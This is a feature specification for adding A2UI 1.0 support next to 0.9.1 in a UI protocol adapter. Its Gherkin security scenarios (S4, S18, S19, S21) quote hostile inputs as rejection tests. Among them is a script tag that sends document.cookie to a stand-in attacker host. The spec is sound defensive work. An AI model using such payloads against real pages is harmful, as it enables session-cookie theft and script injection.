# Feature Specification: A2UI 1.0 alongside 0.9.1

<!-- KIMEN OVERRIDE of spec-template. Resolved with priority 1 by resolve_template().
     Constitutional basis: .specify/memory/constitution.md Art. VIII (Neutral
     Catalog, Disposable Adapters) and Art. II (Proportionate Behavior
     Contracts). -->

**Feature Branch**: `claude/feat-a2ui-1-0-133f09` (spec `039-a2ui-1-0`)

**Created**: 2026-11-16

**Status**: Draft (awaiting founder confirmation)

**Input**: Founder decision (2026-11-16): `@kimen/adapter-a2ui` supports A2UI
1.0 **and** 0.9.1, rather than migrating to 1.0 only. A2UI 1.0 is the
upstream `current` version; 0.9.1 becomes `previous`.

**Constitution check**: this spec extends the contract of
`029-adapter-a2ui`, which stays in force unchanged for 0.9.1. Security-boundary
scenarios S3, S4, S5, S6, S7, S18, S19, S20, S21 and S22 touch the Art. VIII
guardrail and require explicit founder confirmation before implementation.

## Design-source analysis (Figma)

Not applicable: protocol translation layer with no visual surface of its own.
Everything a user sees is an existing catalog component rendered by the
guarded renderer under the active token theme. The governing sources are the
A2UI specification (pinned below) and the `029-adapter-a2ui` contract.

## User Scenarios & Testing *(mandatory)*

### User Story 1 - A 1.0 agent's declarative UI reaches the user safely (Priority: P1)

An agent speaking A2UI 1.0 creates a surface (optionally with its components
and data model in the same message), updates it, and receives the user's
declared actions back as 1.0 events. It gets the same neutral catalog
rendering a 0.9.1 agent gets for the same description.

**Why this priority**: 1.0 is the upstream `current` version; agents built on
the official SDKs now emit 1.0 by default.

**Independent Test**: replay the official 1.0 basic-catalog examples through
the adapter with no live agent, assert only catalog components render, then
activate a declared action and assert the 1.0 event.

**Acceptance Scenarios**: S1, S2, S9, S10, S11, S12, S13, S14, S15.

---

### User Story 2 - Versions never mix and hostile 1.0 input fails closed (Priority: P1)

Each message is checked against the shapes of the version it declares before
any field is read. A message that uses the other version's vocabulary, a
surface addressed in a version other than the one that created it, and every
1.0 attack class the 0.9.1 suite covers (forbidden types, undeclared actions,
unknown properties) plus the new 1.0 surfaces (catalog overrides, reserved
`@` keys, agent-initiated function calls) are rejected whole.

**Why this priority**: two dialects in one adapter double the parsing
surface; version confusion is the classic way to smuggle a feature past the
validator of the other dialect.

**Independent Test**: the adversarial fixture corpus of `029` re-expressed in
1.0, plus cross-version fixtures, each rejected with a structured reason and
nothing rendered.

**Acceptance Scenarios**: S3, S4, S5, S6, S7, S8, S18, S19, S20, S21, S22, S23.

---

### User Story 3 - The matrix states what each version covers (Priority: P2)

A host integrating the adapter reads, per version, the exact upstream
specification, accepted envelope versions, basic catalog id, component
coverage and function handling, and which version the adapter prefers.

**Acceptance Scenarios**: S16, S17.

### Edge Cases

- `createSurface` 1.0 carrying inline `components` that fail validation: the
  whole message is rejected and **no surface is created** (atomic).
- 1.0 `createSurface` without `catalogId` and a component without
  `@catalogId`: the component's catalog is unresolved, the message is
  rejected (`unresolved-catalog`); there is no fallback to capabilities
  (upstream §2.7).
- `{"@call": "@index"}` outside a list template: rejected as malformed
  (upstream: evaluation error).
- A 1.0 component of the reserved type `Surface`: rejected (`reserved-type`).
  Under 0.9.1, `Surface` is just a non-catalog type and degrades as before.
- `v0.9` and `v0.9.1` envelopes stay one family (payload-compatible): a
  0.9.1 surface may receive either, as today.
- An unsolicited `agentFunctionResponse`: rejected (`unexpected-message`);
  the adapter never sends `callAgentFunction`.
- Surface ids are one namespace across versions: creating `s` in 1.0 while
  a 0.9.1 `s` exists is `surface-exists`.

## Gherkin Scenarios *(mandatory, Art. II)*

```gherkin
Feature: A2UI 1.0 alongside 0.9.1 in the A2UI adapter
  @kimen/adapter-a2ui accepts A2UI 1.0 messages next to the 0.9.1 ones it
  already speaks. Each message is handled by the version it declares, checked
  against that version's own shapes, and a surface never mixes versions. Both
  versions translate into the same neutral catalog and reach the screen only
  through the guarded renderer.

  Rule: Each message is handled by the A2UI version it declares

    # S1
    Scenario: A 1.0 surface created in a single message renders as catalog components
      Given an agent speaking A2UI "1.0"
      When the agent creates a surface carrying an order summary card with a "Confirm order" button
      Then the guarded renderer renders the surface
      And every rendered element is a catalog component

    # S2
    Scenario: A 0.9.1 agent gets the same catalog surface as a 1.0 agent
      Given an order summary surface already rendered from A2UI "1.0" messages
      When an agent speaking A2UI "v0.9.1" sends the same order summary in 0.9.1 messages
      Then the 0.9.1 surface renders the same catalog components as the 1.0 surface

    # S3
    Scenario: A message tagged with an unsupported version is rejected
      Given an adapter supporting the A2UI versions "1.0", "v0.9.1" and "v0.9"
      When an agent sends a message tagged "v1.0"
      Then the adapter rejects the message naming the supported versions
      And nothing from the rejected message renders

    # S4
    Scenario: A 1.0 envelope outside the 1.0 shapes is rejected before anything renders
      Given an agent speaking A2UI "1.0"
      When the agent sends a surface creation carrying the undeclared field "onLoad" with value "fetch('https://attacker.example/')"
      Then the whole message is rejected naming the field "onLoad"
      And no surface is created

  Rule: A surface never mixes A2UI versions

    # S5
    Scenario: A 0.9.1 message carrying a 1.0 binding key is rejected
      Given a surface created with A2UI "v0.9.1"
      When the agent sends a 0.9.1 text bound with the 1.0 key "@path" to "/user/firstName"
      Then the message is rejected as malformed for A2UI 0.9.1
      And the surface keeps its previous content

    # S6
    Scenario: A 1.0 component carrying a bare 0.9.1 envelope key is rejected
      Given a surface created with A2UI "1.0"
      When the agent sends a 1.0 text field carrying the bare 0.9.1 key "checks"
      Then the message is rejected naming the unknown property "checks"
      And the surface keeps its previous content

    # S7
    Scenario: A surface accepts only the version that created it
      Given a surface "checkout" created with A2UI "1.0"
      When the agent sends a "v0.9.1" component update for "checkout"
      Then the message is rejected naming the surface version "1.0"
      And the surface keeps its previous content

    # S8
    Scenario: Each version accepts only its own basic catalog
      Given an agent speaking A2UI "1.0"
      When the agent creates a surface on the catalog "https://a2ui.org/specification/v0_9/catalogs/basic/catalog.json"
      Then the adapter rejects the surface naming the 1.0 basic catalog it supports

  Rule: A2UI 1.0 features translate into the neutral catalog

    # S9
    Scenario: Setting a 1.0 data-model path to null removes its value
      Given a 1.0 surface whose text is bound to "/user/firstName" holding "Ada"
      When the agent sets "/user/firstName" to null
      Then the text shows the empty state

    # S10
    Scenario: A declared 1.0 action returns as a 1.0 event carrying its user message
      Given a 1.0 surface whose "Confirm order" button declares the action "confirm-order" with the user message "Order confirmed"
      When the user activates the button
      Then the agent receives an A2UI "1.0" action event naming "confirm-order"
      And the event carries the user message "Order confirmed"

    # S11
    Scenario: The template index function numbers the items of a list
      Given a 1.0 list template over "/items" whose label is the item index with offset 1
      When the data model holds the items "Apple", "Banana" and "Cherry"
      Then the list renders the labels "1", "2" and "3" in that order

    # S12
    Scenario: Plain objects in a 1.0 action context travel as literal data
      Given a 1.0 surface whose data model holds "ada@example.com" at "/user/email"
      And a button whose action context holds an object with "path" "/user/email" and "@@type" "note"
      When the user activates the button
      Then the event context carries "path" "/user/email" and "@type" "note" unchanged
      And the event context does not carry "ada@example.com"

    # S13
    Scenario: A 1.0 text field placeholder reaches the catalog input
      Given an agent speaking A2UI "1.0"
      When the agent sends a text field labeled "Email" with the placeholder "ada@example.com"
      Then a catalog text input labeled "Email" shows the placeholder "ada@example.com"

    # S14
    Scenario: An unmapped 1.0 component type renders its declared fallback
      Given the 1.0 compatibility matrix declares no catalog mapping for "Slider"
      When the agent sends a 1.0 slider that snaps to steps of 5
      Then the declared fallback renders in its place and the gap is reported to the agent
      And the rest of the surface renders normally

    # S15
    Scenario: A value needing an unevaluated function degrades without calling the agent
      Given a 1.0 text whose value calls the basic catalog function "formatDate"
      When the agent sends that component
      Then the declared fallback renders in its place and the gap is reported naming "formatDate"
      And no function call is sent to the agent

  Rule: The compatibility matrix declares coverage per version

    # S16
    Scenario: The matrix binds each version to its exact specification and coverage
      Given the published adapter package
      When the compatibility matrix is consulted
      Then each supported A2UI version names its exact upstream commit, envelope versions and basic catalog
      And each version's component types name their catalog counterpart or their declared fallback

    # S17
    Scenario: The adapter advertises A2UI 1.0 as its preferred version
      Given the published adapter package
      When a host reads the renderer capabilities the adapter declares
      Then A2UI "1.0" comes first with the 1.0 basic catalog
      And "v0.9" follows with the 0.9.1 basic catalog

  Rule: The guardrail holds for A2UI 1.0

    # S18
    Scenario: A 1.0 message using a forbidden type is rejected
      Given the 1.0 compatibility matrix declares the type "html" forbidden for security
      When the agent sends a 1.0 component of type "html" whose content is "<script>fetch('https://attacker.example/'+document.cookie)</script>"
      Then the whole message is rejected naming the forbidden type "html"
      And nothing from the rejected message renders

    # S19
    Scenario: A 1.0 component naming a catalog other than the basic catalog is rejected
      Given a 1.0 surface on the 1.0 basic catalog
      When the agent sends a component whose catalog override names "https://attacker.example/catalog.json"
      Then the whole message is rejected naming the unsupported catalog
      And nothing from the rejected message renders

    # S20
    Scenario: A 1.0 action outside the declared set never dispatches
      Given a 1.0 surface whose declared action set contains only "confirm-order"
      When the agent sends an update binding a button to the action "export-account-data"
      Then the binding is rejected naming the undeclared action
      And activating that button dispatches no event

    # S21
    Scenario: An agent request to run a renderer function is refused
      Given a 1.0 surface "checkout"
      When the agent asks the renderer to run "openUrl" with the URL "https://attacker.example/"
      Then the agent receives a function response with the error code "INVALID_FUNCTION_CALL"
      And no navigation or request leaves the page

    # S22
    Scenario: An unknown reserved key in a 1.0 value is rejected
      Given a 1.0 surface "checkout"
      When the agent sends a button whose action context carries the unknown reserved key "@exec"
      Then the whole message is rejected naming the reserved key "@exec"
      And nothing from the rejected message renders

    # S23
    Scenario: A rejected 1.0 message is reported to the agent in the 1.0 shape
      Given a 1.0 surface "s"
      When the agent sends a card carrying the undeclared property "style"
      Then the agent receives an A2UI "1.0" validation error naming the surface and the offending property
```

### Scenario Family Coverage *(mandatory for UI components, Art. II)*

This is a protocol-translation feature, not a UI component: it introduces no
interactive surface of its own. Everything rendered is an existing catalog
component that carries its own five-family contract.

| Family | Scenario IDs | N/A justification |
|---|---|---|
| Core behavior | S1, S2, S3, S4, S5, S6, S7, S8, S9, S10, S11, S12, S13, S14, S15, S16, S17, S18, S19, S20, S21, S22, S23 | |
| Keyboard path | | N/A — no new interaction pattern; rendered catalog components keep their own keyboard contracts |
| Assistive-tech outcome | | N/A — no new rendered pattern; the accessibility tree is owned by the catalog components' own contracts |
| Form participation | | N/A — no new form control; form behavior belongs to the rendered catalog components |
| Theming | | N/A — the adapter carries no visual values; 1.0 removes `theme` altogether |

## Requirements *(mandatory)*

### Functional Requirements

- **FR-001 (dispatch by version)**: the adapter MUST read the envelope
  `version` first and route the message to that version's validator: `"1.0"`
  to the 1.0 shapes (`agent_to_renderer.json`), `"v0.9.1"` and `"v0.9"` to
  the 0.9.1 shapes (`server_to_client.json`, unchanged from `029`). Every
  other value, or a missing `version`, is rejected naming the supported set
  (S3). No field beyond `version` is read before the version's own envelope
  check passes (S4).
- **FR-002 (no version confusion)**: a message may only use its own
  version's vocabulary. A 0.9.1 message using a 1.0 trait (`@path`, `@call`,
  `@checks`, inline `components`/`dataModel` on `createSurface`,
  `userMessage`, `placeholder`, `callRendererFunction`…) and a 1.0 message
  using a 0.9.1 trait (`path`/`call` bindings, bare `accessibility` or
  `checks`, `theme`, `validationRegexp`, an absent `updateDataModel.value`…)
  are rejected (S5, S6). The upstream transition rule that lets renderers
  accept legacy bare keys on 1.0 components is **not** adopted: the adapter
  is strict.
- **FR-003 (surface version lock)**: a surface is bound to the version
  family of its `createSurface`; any later message for it in another family
  is rejected (`version-mismatch`, S7). Client-to-server messages for a
  surface are written in its version: `v0.9.1` for 0.9.1 surfaces, `1.0`
  for 1.0 surfaces (S10, S23).
- **FR-004 (catalog per version)**: a 0.9.1 surface accepts only the 0.9
  basic-catalog ids of `029`; a 1.0 surface accepts only
  `https://a2ui.org/specification/v1_0/catalogs/basic/catalog.json` as its
  default `catalogId`, as any component `@catalogId` and as any
  `FunctionCall.catalogId` (S8, S19). Kimen advertises no inline catalogs, so
  1.0 catalog mixing reduces to that one catalog.
- **FR-005 (1.0 translation)**: 1.0 messages translate into the same neutral
  catalog nodes as their 0.9.1 equivalents (S2), with the 1.0 differences
  handled as declared in the table below (S9–S13).
- **FR-006 (coverage and degradation)**: each version has its own coverage
  matrix; types without a mapping degrade per node to the fixed fallback of
  `029` and are reported (S14). Functions the adapter does not evaluate
  degrade their component; the adapter never routes them to the agent with
  `callAgentFunction` (S15), deviating on purpose from the 1.0 "fallback to
  agent RPC" rule.
- **FR-007 (guardrail, unchanged invariants)**: for 1.0, only catalog
  components render (S1, S18, S19), only declared actions dispatch (S20),
  unknown properties and unknown single-`@` reserved keys are rejected (S22),
  and no code-execution path exists from spec data: `Action.functionCall`
  stays behind the empty client-function allowlist, and every
  `callRendererFunction` is refused with a `rendererFunctionResponse` whose
  error code is `INVALID_FUNCTION_CALL` (S21) — no basic-catalog function is
  agent-callable (`allowedCallers` defaults to `rendererOnly`), and `openUrl`
  requires user activation.
- **FR-008 (matrix)**: `COMPAT.md` and `src/coverage.ts` declare, per
  version, the pinned upstream commit, accepted envelope versions, emitted
  version, basic-catalog ids, component coverage and function handling; the
  coverage suite fails if they drift (S16). The adapter declares its
  renderer capabilities per version, 1.0 first (S17).
- **FR-009 (no core change)**: all changes stay inside
  `packages/adapter-a2ui` and this spec; zero diffs in `packages/elements`,
  `packages/catalog` or `packages/tokens` (Art. VIII, `029` SC-004).

### Differences 0.9.1 → 1.0 and how each translates

| Area | 0.9.1 | 1.0 | Adapter decision |
|---|---|---|---|
| Envelope `version` | `v0.9.1`, `v0.9` | `1.0` (bare, no `v`) | Dispatch by value; `v1.0` is unsupported (S3) |
| Schema names | `server_to_client.json`… | `agent_to_renderer.json`… | Internal only |
| `createSurface` | `catalogId` required, `theme`, `sendDataModel` | `catalogId` optional (surface default), inline `components` and `dataModel`, `metadata.extensions`; `theme` removed | Inline content applied atomically with the creation (S1); `theme` on 1.0 rejected; `metadata` accepted and ignored |
| Component envelope keys | `accessibility`, `checks` | `@accessibility`, `@checks`, `@catalogId`, `@metadata`; `id` and `component` unprefixed | Strict per version (S6); `@accessibility` and `@metadata` accepted and not rendered; `@catalogId` resolved (S19) |
| Bindings and calls | `{path}`, `{call, args, returnType}` | `{@path}`, `{@call, args, catalogId}`; `returnType` removed | Per-version recognisers; a 0.9.1-shaped binding in a 1.0 string, number or boolean position is malformed (S5) |
| Literal objects | not a dynamic value | plain objects are literal `DynamicValue`s; `@@x` unescapes to `@x`; unknown `@x` keys rejected | Accepted in action-context positions only, unescaped on the way out (S12); unknown reserved keys rejected (S22) |
| `@index` | — | system function, template scope only | Evaluated in templates (S11); outside a template rejected |
| `updateDataModel.value` | optional, absent removes | required, `null` removes | Per version (S9); a 1.0 update without `value` is malformed |
| `Action.event` | `name`, `context` | adds `userMessage` (dynamic string) | Resolved into `action.userMessage` (S10) |
| Agent → renderer calls | — | `callRendererFunction`, `agentFunctionResponse` | Every call refused with `INVALID_FUNCTION_CALL` (S21); an unsolicited response rejected |
| Renderer → agent | `action`, `error` | adds `callAgentFunction`, `rendererFunctionResponse`; `error` codes add `UNALLOWED_PARENT`/`UNALLOWED_CHILD` | Never sends `callAgentFunction` (S15); sends `rendererFunctionResponse` only as a refusal; composition codes unreachable (the basic catalog declares no composition constraints) |
| Transport metadata | `a2uiClientCapabilities`, `a2uiClientDataModel` | `a2uiRendererCapabilities`, `a2uiRendererDataModel` | `sendDataModel` metadata uses the surface's version key; capabilities declared per version (S17) |
| Basic catalog | `specification/v0_9_1/catalogs/basic/catalog.json` | `catalogs/basic/v1/catalog.json`, `protocolVersion: "1.0"` | Separate matrix per version (S16) |
| Basic components | 18 types | same 18 types | Same mapping; property sets differ (below) |
| `TextField` | `validationRegexp` | `placeholder`; `validationRegexp` removed (`@checks` + `regex`) | `placeholder` → `ki-input`/`ki-textarea` `placeholder` (S13) |
| `Video`, `Slider` | — | `posterUrl`, `steps` | Accepted; both types stay unmapped (S14) |
| `Text.variant` | `h1`–`h5`, `caption`, `body` | `caption`, `body` | Not rendered in either version (lossy, unchanged) |
| Check functions | return `boolean` | return `ValidationResult` | `@checks` accepted and not evaluated, as `checks` in 0.9.1 |
| `openUrl` | capability function | `requiresUserActivation: true` | Forbidden in both versions |
| MIME type | `application/json+a2ui` | `application/a2ui+json` | Transport concern, documented for hosts |

### Coverage per version

**0.9.1**: unchanged from `029` (`COMPAT.md`).

**1.0** (basic catalog `catalogs/basic/v1/catalog.json`):

| A2UI type | Coverage | Catalog counterpart | Type-specific properties |
|---|---|---|---|
| Text | inline | — | `text`, `variant`, `weight` |
| Row, Column | layout | — | `children`, `justify`, `align`, `weight` |
| List | mapped | ki-list, ki-list-item | `children`, `direction`, `align`, `weight` |
| Card | mapped | ki-card | `child`, `weight` |
| Tabs | mapped | ki-tabs, ki-tab, ki-tab-panel | `tabs`, `weight` |
| Divider | mapped | ki-divider | `axis`, `weight` |
| Button | mapped | ki-button | `child`, `variant`, `action`, `weight`, `@checks` |
| TextField | mapped | ki-input, ki-textarea | `label`, `value`, `variant`, `placeholder`, `weight`, `@checks` |
| CheckBox | mapped | ki-checkbox | `label`, `value`, `weight`, `@checks` |
| ChoicePicker | mapped | ki-radio-group, ki-radio | `label`, `variant`, `options`, `value`, `displayStyle`, `filterable`, `weight`, `@checks` |
| Image, Icon, Video, AudioPlayer, Modal, Slider, DateTimeInput | unmapped | — | — |
| html, RawHtml, script, iframe | forbidden | — | — |

Common 1.0 envelope keys on every component: `id`, `component`,
`@catalogId`, `@accessibility`, `@metadata`. Functions: as in 0.9.1
(`formatString`, `formatNumber`, `formatCurrency`, `pluralize` evaluated;
`formatDate`, `required`, `regex`, `length`, `numeric`, `email`, `and`, `or`,
`not` degrade; `openUrl` forbidden), plus the system function `@index`
(evaluated in templates).

Unmapped policy is the `029` one for both versions: per-node fallback with a
report, never agent content in the fallback.

**Pending primitives (spec 037)**: text, image and layout primitives are
being added to the catalog in parallel (`037`). Until they merge, `Text`
stays `inline`, `Row`/`Column` stay `layout` and `Image` stays `unmapped` in
**both** matrices. When `037` lands, both matrices switch those rows together
in one change; this spec builds none of them.

### Key Entities

- **Protocol version family**: `0.9.1` (envelopes `v0.9.1`, `v0.9`) or `1.0`
  (envelope `1.0`); owns its validator, matrix, emitted version and catalog
  ids.
- **Surface**: bound at creation to one family, which every later message
  and every client-to-server message for it must use.
- **Renderer capabilities**: per-version capability objects a host
  transport attaches (`a2uiRendererCapabilities` for 1.0,
  `a2uiClientCapabilities` for 0.9.1), preferred version first.

## Constitutional Surface *(mandatory)*

- **Public API delta** (Art. IX): `@kimen/adapter-a2ui` is private 0.0.0.
  Additions: 1.0 protocol types, per-version matrix exports, the renderer
  capabilities declaration, and an `onFunctionResponse` callback for the S21
  refusal. Existing 0.9.1 exports keep their names and values except
  `SUPPORTED_A2UI_VERSIONS`, which gains `1.0`. No change in any other
  package.
- **Bundle budget** (Art. IV): zero impact on `@kimen/elements`; no new
  runtime dependency.
- **Accessibility** (Art. V): no new interaction pattern. Declared gap: 1.0
  asks renderers to plumb `@accessibility` (label, description, live,
  hidden); the adapter accepts and does not render it, as in 0.9.1, until
  the catalog exposes a neutral accessible-name channel.
- **Tokens** (Art. VI): none; 1.0 drops `theme`.
- **Agent legibility** (Art. I): `COMPAT.md` stays the machine-checked
  projection of `src/coverage.ts`, now per version.
- **Guardrail/security boundary** (Art. VIII): this feature widens the
  adapter's parsing surface. S3–S7 and S18–S22 assert the invariants for 1.0
  and across versions and require explicit founder confirmation.

## Success Criteria *(mandatory)*

### Measurable Outcomes

- **SC-001**: the `029` test suites pass; the only edit to them is the one
  the founder approves for the `1.0` row of the 0.9.1 S5 version list (see
  Assumptions).
- **SC-002**: the official 1.0 basic-catalog examples pinned below replay
  through the adapter with only catalog components rendered.
- **SC-003**: 100% of 1.0 and cross-version adversarial fixtures are rejected
  or stay inert with a structured reason; zero render or execute a payload.
- **SC-004**: zero diffs outside `packages/adapter-a2ui` and `specs/039-*`.

## Assumptions

- **Pinned upstream.** 1.0 is implemented as published at
  github.com/google/A2UI (served as github.com/a2ui-project/a2ui) commit
  `57f961f143da23f4212313e432a64b5843d978f9` (main, 2026-11-16):
  `specification/v1_0/` (protocol and schemas) and `catalogs/basic/v1/`
  (basic catalog and examples). `specification/versions.json` and
  a2ui.org list v1.0 as `current` and v0.9.1 as `previous` since 2026-11-06,
  and `specification/v1_0/README.md` declares it stable. The repository has
  no git tag for the 1.0 specification, and one breaking change
  (`feat!`, #4044, `@`-prefixed component envelope keys) landed on
  2026-11-11, after the stable stamp; hence the commit pin, as for 0.9.1.
- 0.9.1 stays pinned at `85120b91e2fe94cb20c8ddef0b545d3da2ae161f`.
- The `029` S5 unit test enumerates `1.0` among rejected versions. Supporting
  1.0 makes that row false by design; the change is limited to removing
  `1.0` from that list (`v1.0` stays) and is subject to founder approval.
- Transport stays caller-owned (MIME type, A2A extension URIs, metadata
  placement).
- Required properties are not enforced beyond what translation needs, in
  either version (status quo of `029`).
